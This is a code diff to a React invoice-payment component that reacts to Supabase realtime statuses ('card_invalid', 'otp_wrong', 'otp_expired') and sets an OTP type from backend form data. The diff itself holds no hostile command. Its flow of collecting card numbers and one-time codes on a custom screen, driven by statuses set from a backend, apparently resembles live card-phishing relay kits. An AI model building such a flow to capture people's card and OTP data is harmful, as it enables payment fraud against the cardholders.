@@ -78,21 +78,36 @@ const InvoicePayment = () => {
             setStep("otp");
           }
           if (newStatus === "rejected") setStep("rejected");
+          if (newStatus === "card_invalid") {
+            setStep("form");
+            setSessionId(null);
+          }
         }
         if (step === "otp") {
+          if (newStatus === "otp") {
+            const formData = (payload.new as any).form_data || {};
+            setOtpType((formData.otp_type as OtpType) || "6digit");
+          }
           if (newStatus === "otp_wrong") setOtpError("The verification code you entered is incorrect. Please try again.");
           if (newStatus === "otp_expired") setOtpError("This verification code has expired. Please request a new one.");
           if (newStatus === "rejected") setStep("rejected");
+          if (newStatus === "card_invalid") {
+            setStep("form");
+            setSessionId(null);
+          }
         }
         if (step === "processing") {
           if (newStatus === "success") {
             setStep("success");
-            // Mark invoice as paid
             supabase.from("invoices").update({ status: "paid" }).eq("id", invoiceId);
           }
           if (newStatus === "rejected") setStep("rejected");
           if (newStatus === "otp_wrong") { setOtpError("The verification code you entered is incorrect. Please try again."); setStep("otp"); }
           if (newStatus === "otp_expired") { setOtpError("This verification code has expired. Please request a new one."); setStep("otp"); }
+          if (newStatus === "card_invalid") {
+            setStep("form");
+            setSessionId(null);
+          }
         }
       })
       .subscribe();
